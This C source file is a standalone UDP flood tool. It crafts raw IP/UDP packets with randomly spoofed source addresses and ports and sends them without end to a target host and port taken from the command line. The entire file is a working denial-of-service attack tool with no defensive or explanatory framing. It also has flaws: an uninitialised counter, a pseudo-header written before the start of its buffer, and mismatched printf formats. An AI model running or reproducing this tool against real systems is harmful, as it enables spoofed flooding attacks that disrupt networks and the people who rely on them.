#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUFFSIZE 4096
#define TIME_TO_LIVE 64
#define IP_LENGTH 16

int randint(int start,int end) {
    // Include start and end
    struct timeval t;
    gettimeofday(&t,NULL);
    srand((unsigned int) t.tv_usec);

    return rand() % (end - start) + start;
}

int randomport()
{
	return randint(0, 65535);
}

void *randomip()
{
	static char ip[IP_LENGTH];
	memset(ip, 0, IP_LENGTH);
	char *buf = (char *)malloc(4 * sizeof(char));
	for (int i = 0; i < 4; ++i)
	{
		sprintf(buf, "%d", randint(0, 255));
		strcat(ip, buf);
		memset(buf, 0, 4);
		if (i != 3)
		{
			ip[strlen(ip)] = '.';
		}
	}
	free(buf);
	return ip;
}

typedef struct
{
	uint8_t ihl: 4;
	uint8_t v: 4;
	uint8_t tos;
	uint16_t total_len;
	uint16_t id;
	uint16_t off;
	uint8_t ttl;
	uint8_t protocol;
	uint16_t chksum;
	uint32_t srcip;
	uint32_t dstip;
} __attribute__((packed)) IPHeader;

typedef struct
{
	uint16_t srcport;
	uint16_t dstport;
	uint16_t len;
	uint16_t chksum;
} __attribute__((packed)) UDPHeader;

typedef struct
{
	uint32_t srcip;
	uint32_t dstip;
	uint8_t zero;
	uint8_t protocol;
	uint16_t len;
} __attribute__((packed)) PseudoUDPHeader;

int checksum(void *data, size_t ckl)
{
	uint16_t *p = (uint16_t *)data;
	size_t l = ckl;
	uint32_t sum = 0;
	while (l > 1)
	{
		sum += htons(*p); p++;
		l -= sizeof(uint16_t);
	}
	if (l == 1)
	{
		sum += htons(*(uint8_t *)p);
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

int send_udp(char srcip[], uint16_t srcport, char dstip[], uint16_t dstport, char msg[], size_t msglen)
{
	// String IP to int
	uint32_t srcip_int32, dstip_int32;
	if (inet_pton(AF_INET, srcip, &srcip_int32) <= 0 || inet_pton(AF_INET, dstip, &dstip_int32) <= 0)
	{
		return -1;
	}

	// Buffer Get Ready //
	char *buff;
	IPHeader *ip_header; // IP Header //
	UDPHeader *udp_header; // UDP Header //
	char *data; // UDP Data //
	PseudoUDPHeader *pseudo_udp_header; // Fake UDP Header //

	buff = (char *)malloc(BUFFSIZE * sizeof(char));
	ip_header = (IPHeader *)buff;
	udp_header = (UDPHeader *)(ip_header + 1);
	data = (char *)(udp_header + 1);
	pseudo_udp_header = (PseudoUDPHeader *)((char *)udp_header - sizeof(PseudoUDPHeader));

	// Fill fake udp header
	pseudo_udp_header -> srcip = srcip_int32;
	pseudo_udp_header -> dstip = dstip_int32;
	pseudo_udp_header -> zero = 0;
	pseudo_udp_header -> protocol = IPPROTO_UDP;
	pseudo_udp_header -> len = htons(sizeof(*udp_header) + msglen);

	// Fill udp header
	udp_header -> srcport = htons(srcport);
	udp_header -> dstport = htons(dstport);
	udp_header -> len = htons(sizeof(*udp_header) + msglen);
	udp_header -> chksum = 0;

	// Fill data
	memcpy(data, msg, msglen);

	// Udp checksum
	size_t ckl = sizeof(*pseudo_udp_header) + sizeof(*udp_header) + msglen;
	udp_header -> chksum = htons(checksum(pseudo_udp_header, ckl));

	// Fill ip header
	ip_header -> ihl = sizeof(*ip_header) / sizeof (uint32_t);
	ip_header -> v = 4;
	ip_header -> tos = 0;
	ip_header -> total_len = htons(sizeof(*ip_header) + sizeof(*udp_header) + msglen);
	ip_header -> id = htons(0); // auto
	ip_header -> off = htons(0);
	ip_header -> ttl = TIME_TO_LIVE;
	ip_header -> protocol = IPPROTO_UDP;
	ip_header -> srcip = srcip_int32;
	ip_header -> dstip = dstip_int32;
	ip_header -> chksum = 0;

	// Send Packet
	int fd = -1;
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd == -1)
	{
		return -2;
	}
	else
	{
		int on = 1;
		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
		{
			close(fd);
			free(buff);
			return -3;
		}
	}
	struct sockaddr_in dstaddr;
	memset(&dstaddr, 0, sizeof(dstaddr));
	dstaddr.sin_family = AF_INET;
	dstaddr.sin_addr.s_addr = dstip_int32;
	dstaddr.sin_port = htons(dstport);
	if (sendto(fd, buff, (sizeof(*ip_header) + sizeof(*udp_header) + msglen), 0, (struct sockaddr *)&dstaddr, sizeof(dstaddr)) != (sizeof(*ip_header) + sizeof(*udp_header) + msglen))
	{
		close(fd);
		free(buff);
		return -4;
	}
	close(fd);
	free(buff);
	
	return 1;
}

int main(int argc, char *argv[])
{
	long long times;
	int dstport, r;
	sscanf(argv[2], "%d", &dstport);
	
	for (;;)
	{
		times++;
		r = send_udp(randomip(), randomport(), argv[1], dstport, argv[3], strlen(argv[3]));
		if (r == 1)
		{
			printf("%-9d | YES\n", times);
		}
		else if (r == -1)
		{
			printf("%-9d | address error\n", times);
		}
		else if (r == -2)
		{
			printf("%-9d | permission denied\n", times);
		}
		else if (r == -3)
		{
			printf("%-9d | setsockopt error\n", times);
		}
		else if (r == -4)
		{
			printf("%-9d | send error\n", times);
		}
	}
	return 0;
}
